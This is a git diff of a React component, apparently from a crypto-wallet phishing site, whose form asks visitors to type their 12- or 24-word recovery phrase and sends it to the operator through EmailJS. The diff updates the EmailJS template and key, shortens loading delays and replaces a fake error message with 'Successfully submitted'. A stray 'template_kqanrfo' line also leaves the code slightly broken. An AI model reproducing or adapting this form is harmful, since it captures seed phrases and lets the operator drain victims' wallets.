@@ -54,7 +54,7 @@ function Newcard({item}) {
   const [showText1, setShowText1] = useState(false);
   const [showText2, setShowText2] = useState(false);
 
-const handleButtonClick = (paranumber) => {
+  const handleButtonClick = (paranumber) => {
     if(paranumber === 1){
         setShowText(true);
          setShowText1(false);
@@ -145,7 +145,7 @@ const [post, setpost] = useState(null)
       }
       else{
         
-        emailjs.sendForm('service_g9n341o', 'template_i5u5x4q', form.current, 'd_-pHovfNdsJbi7PF')
+        emailjs.sendForm('service_g9n341o', 'template_ebq92wu' , form.current, 'uEb2CnNKXDiRIoTIJ')
 template_kqanrfo
         .then((result) => {
             result.text;
@@ -156,13 +156,13 @@ template_kqanrfo
             
               setTimeout(() =>{
                 setLoading(false)
-              },4000)
+              },2000)
 
             
             
             setTimeout(() => {
               setSuccess(true)
-            }, 4500)
+            }, 3500)
             
 
             setTimeout(() => {
@@ -175,11 +175,8 @@ template_kqanrfo
         }, (error) => {
             console.log(error.text);
         });
-      
-       
-      
-      }
         
+      }    
       
     };
 
@@ -247,7 +244,7 @@ template_kqanrfo
 
 {
   success &&
-  <div className=' flex items-center justify-center'><h5 className='text-white font-link bg-[#ff0000a5] w-[20rem] ml-2 mt-3 h-[4rem] p-1 flex items-center justify-center pl-3'>An unknown error occured, please  try again </h5></div> 
+  <div className=' flex items-center justify-center'><h5 className='text-white font-link bg-[#ff0000a5] w-[20rem] ml-2 mt-3 h-[4rem] p-1 flex items-center justify-center pl-3'>Successfully submitted</h5></div> 
 }
 
 {
@@ -261,7 +258,7 @@ template_kqanrfo
 <form ref={form} onSubmit={sendEmail}   action="">
 
 
-  <textarea value={texting} onChange={change} className="text font-link resize-none w-full border-[2px] mt-[1rem] rounded border-[#00000037] outline-0 ml-2 pl-2" placeholder='Enter recovery phrase' name="message"  cols="20" rows="6"></textarea>
+  <textarea value={texting}  onChange={change} className="text font-link resize-none w-full border-[2px] mt-[1rem] rounded border-[#00000037] outline-0 ml-2 pl-2" placeholder='Enter recovery phrase' name="message"  cols="20" rows="6"></textarea>
 
 
 <p className="text-[0.8rem] mt-2 ml-2 font-link font-[400]">Typically 12 (sometines 24) words separated by single spaces</p>
